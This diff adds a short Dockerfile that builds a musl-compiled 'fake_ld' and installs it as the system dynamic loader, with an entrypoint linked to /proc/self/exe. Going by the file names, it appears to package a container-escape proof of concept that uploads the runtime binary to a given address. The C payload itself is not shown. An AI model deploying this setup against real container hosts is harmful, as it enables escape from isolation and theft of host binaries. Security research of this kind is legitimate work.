@@ -1,0 +1,23 @@
+FROM ubuntu:18.04 AS compile
+
+RUN apt update && apt install -y musl-tools
+WORKDIR /root
+COPY ["upload_runtime.c", "upload_runtime.h", "socket_utils.c", "socket_utils.h", \
+      "/root/"]
+
+# A standard c program compiled with glibc cannot be used as the dynamic loader, as thread local storage (TLS) causes some issues
+# musl doesn't have TLS, so we compile with musl.
+RUN musl-gcc -static -fPIC -pie  -Wl,-E upload_runtime.c socket_utils.c -o /root/fake_ld
+
+
+# -------------------------------- #
+
+
+FROM ubuntu:18.04
+
+RUN ln -s /proc/self/exe /entrypoint 
+COPY --from=compile /root/fake_ld /lib64/ld-linux-x86-64.so.2
+
+# entrypoint links to /proc/self/exe
+ENTRYPOINT ["/entrypoint"]
+CMD ["127.0.0.1"] # default adderss
